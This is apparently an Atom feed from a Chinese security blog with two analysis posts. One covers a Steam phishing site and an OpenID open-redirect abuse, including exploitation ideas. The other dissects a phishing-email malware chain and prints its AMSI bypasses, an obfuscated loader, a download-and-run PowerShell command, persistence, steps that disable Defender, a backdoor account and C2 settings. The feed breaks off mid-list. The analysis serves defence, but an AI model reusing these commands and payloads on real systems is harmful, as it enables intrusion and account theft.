<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九世的博客</title>
  
  
  <link href="http://jiushill.github.io/atom.xml" rel="self"/>
  
  <link href="http://jiushill.github.io/"/>
  <updated>2023-08-08T22:02:38.678Z</updated>
  <id>http://jiushill.github.io/</id>
  
  <author>
    <name>九世</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Steam上的黑产哥钓鱼手法</title>
    <link href="http://jiushill.github.io/posts/b2a7e9f.html"/>
    <id>http://jiushill.github.io/posts/b2a7e9f.html</id>
    <published>2023-08-08T19:34:56.000Z</published>
    <updated>2023-08-08T22:02:38.678Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打个csgo还有黑产哥过来钓鱼，真的蚌埠住。。。之前没有今天从buff买了个”可燃冰AK”、”后发制人的沙鹰”就收到了？疑似有爬虫爬buff挨个加好友钓鱼 x<br><img src="https://i.miji.bid/2023/08/09/71cdce098a3d9ca95b18866eb0769a54.jpeg" alt=""></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>黑产佬:<a href="https://steamcommunity.com/id/Suzanne101986" target="_blank" rel="noopener">https://steamcommunity.com/id/Suzanne101986</a><br><img src="https://i.miji.bid/2023/08/09/765fd0e870f8bb88487bddb9ab5c9c80.png" alt=""></p><p><img src="https://i.miji.bid/2023/08/09/bd295c9da8647bc13875e85e95511d13.png" alt=""></p><p>好友我删了，话术大概是这样的</p><pre><code>XXX:我们是不是认识xxx:上一个月我好像排到过你xxx:你csgo段位是多少xxx:我们在打5e竞技，可以和外国人打xxx:我们缺一个人，邀请你来打xxx:不参加投个票，投票随机获取一个饰品 -&gt; 让你在他那个站登录steamxxx:https://bisaixiaoxin.com/ -&gt;钓鱼站</code></pre><p><img src="https://i.miji.bid/2023/08/09/5dc9fed60a04703871930c66e65a130f.png" alt=""></p><p>一看这域名我tm傻眼了，(图片都显示不出来，用点心吧)<br><img src="https://i.miji.bid/2023/08/09/0e8c01f3afcd18e08e29a81a0a6f757f.png" alt=""></p><p>点击steam登录如下 【新弹个div，然后用js记录输入的账号密码，你登录完后在跳转会当前页面】<br><img src="https://i.miji.bid/2023/08/09/f52f2cc0ce49b4cc3c5752f2f4d84ec6.png" alt=""><br><img src="https://i.miji.bid/2023/08/09/6ea91f0e4f7f3080d47e863f0c39d308.png" alt=""></p><p>抓了一下包js还是混淆的<br><img src="https://i.miji.bid/2023/08/09/c2c6ccd89827b9600970223b0c309bb8.png" alt=""></p><p>用的这个加密:<a href="https://www.json.cn/json/jshx.html" target="_blank" rel="noopener">https://www.json.cn/json/jshx.html</a></p><p>google一搜啥都没看见，域名whois一看google cf，注册时间去年7月<br><img src="https://i.miji.bid/2023/08/09/cdacb32ec974bf04653dd04cb564cabb.png" alt=""></p><p>钓鱼url:</p><pre><code>https://steamcommunity.com/openid/login?openid.ns=http://specs.openid.net/auth/2.0&amp;openid.mode=checkid_setup&amp;openid.return_to=https://https://bisaixiaoxin.com/?login&amp;openid.realm=https://https://bisaixiaoxin.com&amp;openid.ns.sreg=http://openid.net/extensions/sreg/1.1&amp;openid.claimed_id=http://specs.openid.net/auth/2.0/identifier_select&amp;openid.identity=http://specs.openid.net/auth/2.0/identifier_select</code></pre><p>拆开参数测试，发现是个URL跳转漏洞<code>https://steamcommunity.com/openid/login?openid.ns=http://specs.openid.net/auth/2.0&amp;openid.mode=checkid_setup&amp;openid.return_to=http://nn44f6.dnslog.cn</code></p><p>在steam上显示是这样的<br><img src="https://i.miji.bid/2023/08/09/41115cc83bfd01271f959bf5ccdddcc5.png" alt=""></p><p>登录后，点击授权后会请求过来<br><img src="https://i.miji.bid/2023/08/09/e41b0f6fb4226f4b9f97a9b418b573b0.png" alt=""></p><p><img src="https://i.miji.bid/2023/08/09/49c5e967101f88da2399c1c07ce70ce8.png" alt=""></p><p>看了一下url跳转<br><img src="https://i.miji.bid/2023/08/09/f85a00df62f1ba469624cdeefd252fb5.png" alt=""></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>以假乱真，登录完账号密码，在跳回当前页面 （在你登录成功后2fa后，短时间内不在需要二步验证）<br>偷龙换凤，搞个真的授权跳转到自己这，然后把token偷了<br>暗度陈仓，你成功登录后他url跳转把你饰品卖 （url跳转+csrf打组合拳）</p><h2 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h2><p>从微步社区来看最早21年03月就有师傅曝光了<br><a href="https://x.threatbook.com/v5/article?threatInfoID=3293" target="_blank" rel="noopener">https://x.threatbook.com/v5/article?threatInfoID=3293</a> </p><p>从b站21年开头就有人写了<br><a href="https://www.bilibili.com/video/BV16K411M7Eq/" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16K411M7Eq/</a></p><p>所以今年都23年了快24年了都不修吗</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>不要轻易相信任何人:D</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;打个csgo还有黑产哥过来钓鱼，真的蚌埠住。。。之前没有今天从buff买了个”可燃冰AK”、”后发制人的沙鹰”就收到了？疑似有爬虫爬buff</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://jiushill.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>某钓鱼邮件分析</title>
    <link href="http://jiushill.github.io/posts/6e8ca819.html"/>
    <id>http://jiushill.github.io/posts/6e8ca819.html</id>
    <published>2023-08-07T06:53:28.000Z</published>
    <updated>2023-08-07T07:30:52.421Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>划水摆烂分析点东西</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.securonix.com/blog/securonix-threat-labs-security-meme4chan-advisory/" target="_blank" rel="noopener">https://www.securonix.com/blog/securonix-threat-labs-security-meme4chan-advisory/</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>在线沙箱:<br><a href="https://app.any.run/tasks/33363f16-8146-4bef-948b-362ec2cb0f6d/" target="_blank" rel="noopener">https://app.any.run/tasks/33363f16-8146-4bef-948b-362ec2cb0f6d/</a><br><a href="https://www.joesandbox.com/analysis/1284837/1/html" target="_blank" rel="noopener">https://www.joesandbox.com/analysis/1284837/1/html</a></p><p>CVE-2022-30190利用<br>（远程链接）<br><a href="https://huskidkifklaoksikfkfijsju.blogspot.com/atom.xml" target="_blank" rel="noopener">https://huskidkifklaoksikfkfijsju.blogspot.com/atom.xml</a> #已404<br><a href="https://73cceb63-7ecd-45e2-9eab-f8d98aab177f.usrfiles.com/ugd/73cceb_b5b6005e2aa74cf48cd55dca1a2ff093.docx" target="_blank" rel="noopener">https://73cceb63-7ecd-45e2-9eab-f8d98aab177f.usrfiles.com/ugd/73cceb_b5b6005e2aa74cf48cd55dca1a2ff093.docx</a><br><img src="https://s1.ax1x.com/2023/08/07/pPEBdnH.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/08/07/pPEBDAI.png" alt=""></p><p>从分析文找到远程加载的payload<br><img src="https://s1.ax1x.com/2023/08/07/pPEB69f.png" alt=""></p><pre><code>http://73cceb63-7ecd-45e2-9eab-f8d98aab177f.usrfiles.com/ugd/73cceb_e5a698286daf43ac87b4544a35b1a482.txt</code></pre><p>可以看到有几个混淆的变量</p><pre><code>$X1$colabber$Hetmosphyre$X2</code></pre><p><strong>阶段一</strong></p><pre><code>-&gt; 运行winword -&gt;延迟3秒 -&gt; 删除C:\Users\*\Downloads\下的所有.docx文件 -&gt; 删除C:\Users\*\Desktop\下的所有.docx文件 -&gt; 创建C:\ProgramData\MinMinons -&gt;将$Gamilopera写入C:\ProgramData\MinMinons\Candlegraphy.~___~-&gt;IEX运行$Gamilopera变量</code></pre><p><img src="https://s1.ax1x.com/2023/08/07/pPEBhHs.png" alt=""></p><pre><code>$X1-&gt;js内容三层hex解密        -&gt;js内容写入到C:\ProgramData\MinMinons\Microsoftupdate.js        -&gt;创建计划任务运行js schtasks /create /sc MINUTE /mo 180 /tn MOperaChrome /F /tr C:\ProgramData\MinMinons\Microsoftupdate.js        js阶段:            -&gt;ActiveXObject组件通过CLSID:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}实例化wscript.Shell            -&gt;延迟3秒            -&gt;要运行的命令替换运行powershell-&gt; powershell -EP Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candlegraphy.~___~ | .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1</code></pre><p><img src="https://s1.ax1x.com/2023/08/07/pPEDS4x.png" alt=""></p><p>C:\ProgramData\MinMinons\Microsoftupdate.js</p><pre><code>var  _0x3195=[&quot;\x6E\x65\x77\x3A\x7B\x46\x39\x33\x35\x44\x43\x32\x32\x2D\x31\x43\x46\x30\x2D\x31\x31\x44\x30\x2D\x41\x44\x42\x39\x2D\x30\x30\x43\x30\x34\x46\x44\x35\x38\x41\x30\x42\x7D&quot;,&quot;\x53\x6C\x65\x65\x70&quot;,&quot;\x70\x6F\x77\x65\x72\x73\x68\x2A\x5E\x20\x2D\x45\x50\x20\x42\x79\x70\x61\x73\x73\x20\x2D\x63\x20\x47\x65\x74\x2D\x43\x6F\x6E\x74\x65\x6E\x74\x20\x2D\x52\x41\x57\x20\x43\x3A\x5C\x50\x72\x6F\x67\x72\x61\x6D\x44\x61\x74\x61\x5C\x4D\x69\x6E\x4D\x69\x6E\x6F\x6E\x73\x5C\x43\x61\x6E\x64\x6C\x2A\x67\x72\x61\x70\x68\x79\x2E\x7E\x5F\x5F\x5F\x7E\x20\x7C\x20\x2E\x28\x27\x7B\x78\x7D\x7B\x39\x7D\x27\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x39\x27\x2C\x27\x30\x27\x29\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x78\x27\x2C\x27\x31\x27\x29\x2D\x66\x27\x47\x49\x4D\x47\x55\x4C\x27\x2C\x27\x25\x25\x27\x29\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x25\x25\x27\x2C\x27\x49\x27\x29\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x47\x49\x4D\x47\x55\x4C\x27\x2C\x27\x45\x58\x27\x29\x20\x7C\x20\x70\x69\x6E\x67\x20\x31\x32\x37\x2E\x30\x2E\x30\x2E\x31&quot;,&quot;\x2A&quot;,&quot;\x65&quot;,&quot;\x72\x65\x70\x6C\x61\x63\x65&quot;,&quot;\x5E&quot;,&quot;\x6C\x6C&quot;,&quot;\x52\x75\x6E&quot;];/*new:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}Sleeppowersh*^ -EP Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candl*graphy.~___~ |  .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1*ereplace^llRun*/combackmyex= ActiveXObject(_0x3195[0]); //new:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}WScript[_0x3195[1]](3000); //延??时???3秒? Sleep(3000)Jigijigi= _0x3195[2]; //powersh*^ -EP Bypass -c Get-Content -RAW  C:\ProgramData\MinMinons\Candl*graphy.~___~ |  .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1Jigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[6],_0x3195[7]); //replace ^ ll -&gt; powershell -EP  Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candlegraphy.~___~ |  .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1combackmyex[_0x3195[8]](Jigijigi,0,true) //Run 运?行Dpowershell</code></pre><p>C:\ProgramData\MinMinons\Candlegraphy.~___~<br><img src="https://s1.ax1x.com/2023/08/07/pPEDIqH.png" alt=""></p><p><strong>阶段2</strong><br>$colabber<br>$Hetmosphyre<br>实现的功能</p><pre><code>-&gt; [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) AMSI绕过        -&gt; 注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;        -&gt;解密两个.NET的PE，分别赋值变量$Ripple - 2.4.dll 和$$Ripple - chas.exe        -&gt;$Ripple .NET内存加载 2.4.dll nanamespace:A class:B Method:C            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe&quot;,[OBJECT[]]$Ripple)            内存加载实现将chas.exe进程注入到RegSvcs.exe和Msbuild.exe</code></pre><p><img src="https://s1.ax1x.com/2023/08/07/pPEDzLQ.png" alt=""></p><pre><code>* 2.4.dll - 傀儡进程* chas.exe - C2</code></pre><p>DLL是用de4ot混淆过的<br><img src="https://s1.ax1x.com/2023/08/07/pPEr9ds.png" alt=""><br><img src="https://s1.ax1x.com/2023/08/07/pPErCon.png" alt=""></p><p>2.4.DLL<br><img src="https://s1.ax1x.com/2023/08/07/pPErFJ0.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/df1df47780927aec30f7c355c3bf66a4.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/836e42a880d48050217ddc307c33f7cc.png" alt=""></p><p>去混淆</p><pre><code>        public static string smethod_0(string string_11)        {            StringBuilder stringBuilder = new StringBuilder();            for (int i = 0; i &lt; string_11.Length; i += 2)            {                int value = Convert.ToInt32(string_11.Substring(i, 2), 16);                stringBuilder.Append(Convert.ToChar(value));            }            return stringBuilder.ToString();        }        public static string ReverseString(string s)        {            char[] array = s.ToCharArray();            Array.Reverse(array);            return new string(array);        }</code></pre><pre><code>    // Token: 0x04000001 RID: 1        private static string string_0 = B.smethod_0(B.ReverseString(&quot;2333C656E62756B6&quot;)); //Kernel32        // Token: 0x04000002 RID: 2        private static string string_1 = B.smethod_0(B.ReverseString(&quot;46165627864556D657375625&quot;)); //ResumeThread        // Token: 0x04000003 RID: 3        private static string string_2 = B.smethod_0(&quot;576F77363&lt;?&gt;53657&lt;?&gt;5&lt;?&gt;687265616&lt;?&gt;&lt;?&gt;36F6E7&lt;?&gt;65787&lt;?&gt;&quot;.Replace(&quot;&lt;?&gt;&quot;, &quot;4&quot;)); //Wow64SetThreadContext        // Token: 0x04000004 RID: 4        private static string string_3 = B.smethod_0(B.ReverseString(&quot;47875647E6F634461656278645475635&quot;)); //SetThreadContext        // Token: 0x04000005 RID: 5        private static string string_4 = B.smethod_0(&quot;57?F773?3447?57454?872?5?1?443?F?E74?57874&quot;.Replace(&quot;?&quot;, &quot;6&quot;)); //Wow64GetThreadContext        // Token: 0x04000006 RID: 6        private static string string_5 = B.smethod_0(B.ReverseString(&quot;47875647E6F634461656278645475674&quot;)); //GetThreadContext        // Token: 0x04000007 RID: 7        private static string string_6 = B.smethod_0(&quot;5??9727475?1?C41?C?C?F?34578&quot;.Replace(&quot;?&quot;, &quot;6&quot;)); //VirtualAllocEx        // Token: 0x04000008 RID: 8        private static string string_7 = B.smethod_0(B.ReverseString(&quot;9727F6D656D437375636F627055647962775&quot;)); //WriteProcessMemory        // Token: 0x04000009 RID: 9        private static string string_8 = B.smethod_0(&quot;5265616450?26F6365?3?34D656D6F?2?9&quot;.Replace(&quot;?&quot;, &quot;7&quot;)); //ReadProcessMemory        // Token: 0x0400000A RID: 10        private static string string_9 = B.smethod_0(B.ReverseString(&quot;E6F6964736563566F4775696650716D6E65577A5&quot;)); //ZwUnmapViewOfSection        // Token: 0x0400000B RID: 11        private static string string_10 = B.smethod_0(&quot;4372?5?174?55072?F?3?5737341&quot;.Replace(&quot;?&quot;, &quot;6&quot;)); //CreateProcessA        // Token: 0x0400000C RID: 12        private static readonly B.Delegate0 delegate0_0 = B.smethod_1&lt;B.Delegate0&gt;(B.string_0, B.string_1);        // Token: 0x0400000D RID: 13        private static readonly B.Delegate1 delegate1_0 = B.smethod_1&lt;B.Delegate1&gt;(B.string_0, B.string_2);        // Token: 0x0400000E RID: 14        private static readonly B.Delegate2 delegate2_0 = B.smethod_1&lt;B.Delegate2&gt;(B.string_0, B.string_3);        // Token: 0x0400000F RID: 15        private static readonly B.Delegate3 delegate3_0 = B.smethod_1&lt;B.Delegate3&gt;(B.string_0, B.string_4);        // Token: 0x04000010 RID: 16        private static readonly B.Delegate4 delegate4_0 = B.smethod_1&lt;B.Delegate4&gt;(B.string_0, B.string_5);        // Token: 0x04000011 RID: 17        private static readonly B.Delegate5 delegate5_0 = B.smethod_1&lt;B.Delegate5&gt;(B.string_0, B.string_6);        // Token: 0x04000012 RID: 18        private static readonly B.Delegate6 delegate6_0 = B.smethod_1&lt;B.Delegate6&gt;(B.string_0, B.string_7);        // Token: 0x04000013 RID: 19        private static readonly B.Delegate7 delegate7_0 = B.smethod_1&lt;B.Delegate7&gt;(B.string_0, B.string_8);        // Token: 0x04000014 RID: 20        private static readonly B.Delegate8 delegate8_0 = B.smethod_1&lt;B.Delegate8&gt;(B.smethod_0(&quot;6E74646C6C&quot;), B.string_9);        // Token: 0x04000015 RID: 21        private static readonly B.Delegate9 delegate9_0 = B.smethod_1&lt;B.Delegate9&gt;(B.string_0, B.string_10);</code></pre><p>chas.exe<br>创建互斥体，线程随机延时。接收socket回包执行对应的功能<br><img src="https://i.miji.bid/2023/08/07/2496b987750dc9814579b195f2eaadc9.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/440cea9821448965fc73385b936496cb.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/8c5934f0b07e2222a44dd6e54b541ec1.png" alt=""></p><p>C2配置</p><pre><code>namespace Stub{    // Token: 0x02000007 RID: 7    public class Settings    {        // Token: 0x04000006 RID: 6        public static string Host = &quot;stanthely2023.duckdns.org&quot;;        // Token: 0x04000007 RID: 7        public static string Port = &quot;7000&quot;;        // Token: 0x04000008 RID: 8        public static string KEY = &quot;&lt;123456789&gt;&quot;;        // Token: 0x04000009 RID: 9        public static string SPL = &quot;&lt;Xwormmm&gt;&quot;;        // Token: 0x0400000A RID: 10        public static string USBNM = &quot;USB.exe&quot;;        // Token: 0x0400000B RID: 11        public static readonly string Mutexx = &quot;tddITwpC5yRaJiTI&quot;;        // Token: 0x0400000C RID: 12        public static Mutex _appMutex;        // Token: 0x0400000D RID: 13        public static bool usbC;        // Token: 0x0400000E RID: 14        public static string current = Process.GetCurrentProcess().MainModule.FileName;    }</code></pre><p>通讯使用AES加密<br><img src="https://i.miji.bid/2023/08/07/0ebfc30b0ca07191655dbd1667f80e36.png" alt=""></p><p>C2功能：<br>|function|note|<br>|——–|—-|<br>|Ping|心跳包功能|<br>|Info|获取被控主机详细信息|<br>|admin|判断是否为管理员|<br>|Antivirus|枚举杀毒|<br>|STDos|DDOS|<br>|Plugin|动态加载.NET|<br>|Download|下载者|<br>|getDrives|枚举盘符/USB|<br>|getFiles|获取文件信息|<br>|getFolders|遍历文件夹|</p><p><img src="https://i.miji.bid/2023/08/07/88977dc504340d8fe6a4e1ef632510f4.png" alt=""></p><p>$DEP</p><pre><code>-&gt;  注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;        -&gt; Defender后缀加白:&quot;.bat&quot;,&quot;.ppam&quot;,&quot;.xls&quot;,&quot;.docx&quot;,&quot;.bat&quot;,&quot;.exe&quot;,&quot;.vbs&quot;,&quot;.js&quot;,路径加白:&quot;C:\&quot;,&quot;D:\&quot;,&quot;E:\&quot;,进程加白:&quot;explorer.exe&quot;,&quot;kernel32.dll&quot;,&quot;kernel32.dll&quot;,&quot;aspnet_compiler.exe&quot;,&quot;cvtres.exe&quot;,&quot;CasPol.exe&quot;,&quot;csc.exe&quot;,&quot;csc.exe&quot;,&quot;Msbuild.exe&quot;,&quot;ilasm.exe&quot;,&quot;InstallUtil.exe&quot;,&quot;jsc.exe&quot;,&quot;Calc.exe&quot;,&quot;powershell.exe&quot;,&quot;rundll32.exe&quot;,&quot;conhost.exe&quot;,&quot;Cscript.exe&quot;,&quot;mshta.exe&quot;,&quot;cmd.exe&quot;,&quot;DefenderisasuckingAntivirus&quot;,&quot;wscript.exe&quot; IP加白:&quot;127.0.0.1&quot;        -&gt; Defender IDS关闭        -&gt; Defender关闭        -&gt; UAC限制开启 New-Ipublicroperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force        -&gt; 停止WinDefend服务，取消WinDefend服务自启        -&gt; 创建用户System32 pwd:123添加到管理员,将创建的System32用户添加到&quot;Remote Desktop Users&quot;组        -&gt; 停止WinDefend服务，停止WdNisSvc服务，停止WdNisSvc服务，删除windefend服务        -&gt; 防火墙关闭</code></pre><p><img src="https://i.miji.bid/2023/08/07/8dac8d365b310d93269d96defc35bc89.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/592b5898dfb4f6907f6bb866e7655ae0.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/441f58300fbe730c550b6b13596a2bc6.png" alt=""></p><p><strong>阶段3</strong><br>$X2</p><pre><code>    -&gt; 三层hex解密js内容写入C:\ProgramData\MinMinons\miguan.js        -&gt; 计划任务运行miguan.js schtasks /create /sc MINUTE /mo 164 /tn miguaned /F /tr &quot;$helogamanunu C:\\ProgramData\\MinMinons\\miguan.js&quot;            -&gt; 5秒后计划执行powershell Schtasks.exe /create /sc minute /mo 120 /tn escansupdate /f /tr “wscript.exe //b //e:jscript c:\\programdata\\REDACTED\\windowsdefenderupdate.js”    powershell.exe    “c:\windows\system32\windowspowershell\v1.0\powershell.exe” -ep bypass -c (i’w’r(‘hxxps://powpowpowff.blogspot[.]com/atom.xml’) -useb) | .(‘{1}{0}’-f’ex’,’i’) | ping 127.0.0.1        -&gt; 将&quot;C:\\ProgramData\\MinMinons\&quot; 下所有文件复制到开机自启路径(Startup)        -&gt;删除C:\ProgramData\MinMinons\Candlegraphy.~___~        -&gt;删除C:\ProgramData\MinMinons\*.vbs        -&gt;删除C:\ProgramData\MinMinons\*.exe</code></pre><p><img src="https://i.miji.bid/2023/08/07/2d2fd253577209b45a6af9606d552608.png" alt=""></p><pre><code> eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return  d[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--){if(k[c]){p=p.replace(new  RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c])}}return p}(&#39;4=q(&quot;o:{n-m-l-g-j}&quot;);i[&quot;8&quot;](d);2=&quot;b&gt;h*^ -a  p&gt;&gt; -c (5\&#39;w\&#39;r(\&#39;k\&#39;) -u&gt;*B) |  .(\&#39;{x}{9}\&#39;.3(\&#39;9\&#39;,\&#39;0\&#39;).3(\&#39;x\&#39;,\&#39;1\&#39;)-f\&#39;6\&#39;,\&#39;%%\&#39;).3(\&#39;%%\&#39;,\&#39;5\&#39;).3(\&#39;6\&#39;,\&#39;t\&#39;) |  v  A.0.0.1&quot;;2=2.3(&quot;*&quot;,&quot;e&quot;);2=2.3(&quot;*&quot;,&quot;e&quot;);2=2.3(&quot;*&quot;,&quot;e&quot;);2=2.3(&quot;^&quot;,&quot;z&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);4[&quot;y&quot;](2,0,7);&#39;,38,38,&#39;||Jigijigi|replace|combackmyex|I|geleography|true|Sleep||eP|power||5000|||ADB9||WScript|00C04FD58A0B|https://billielishhui.blogspot.com/atom.xml|11D0|1CF0|F935DC22|new|Bypa|ActiveXObject|||EX||ping|||RUN|ll|127|&#39;.split(&#39;|&#39;),0,{}))</code></pre><p>全部流程：</p><pre><code>1.ps1-&gt; 运行winword-&gt;延迟3秒-&gt; 删除C:\Users\*\Downloads\下的所有.docx文件-&gt; 删除C:\Users\*\Desktop\下的所有.docx文件-&gt; 创建C:\ProgramData\MinMinons-&gt;将$Gamilopera写入C:\ProgramData\MinMinons\Candlegraphy.~___~-&gt;IEX运行$Gamilopera变量    第一阶段:        -&gt;js内容三层hex解密        -&gt;js内容写入到C:\ProgramData\MinMinons\Microsoftupdate.js        -&gt;创建计划任务运行js schtasks /create /sc MINUTE /mo 180 /tn MOperaChrome /F /tr C:\ProgramData\MinMinons\Microsoftupdate.js        js阶段:            -&gt;ActiveXObject组件通过CLSID:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}实例化wscript.Shell            -&gt;延迟3秒            -&gt;要运行的命令替换运行powershell-&gt; powershell -EP Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candlegraphy.~___~ | .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1    第二阶段:        -&gt; [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) AMSI绕过        -&gt; 注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;        -&gt;解密两个.NET的PE，分别赋值变量$Ripple - 2.4.dll 和$$Ripple - chas.exe        -&gt;$Ripple .NET内存加载 2.4.dll nanamespace:A class:B Method:C            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe&quot;,[OBJECT[]]$Ripple)            内存加载实现将chas.exe进程注入到RegSvcs.exe和Msbuild.exe        -&gt;  注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;        -&gt; 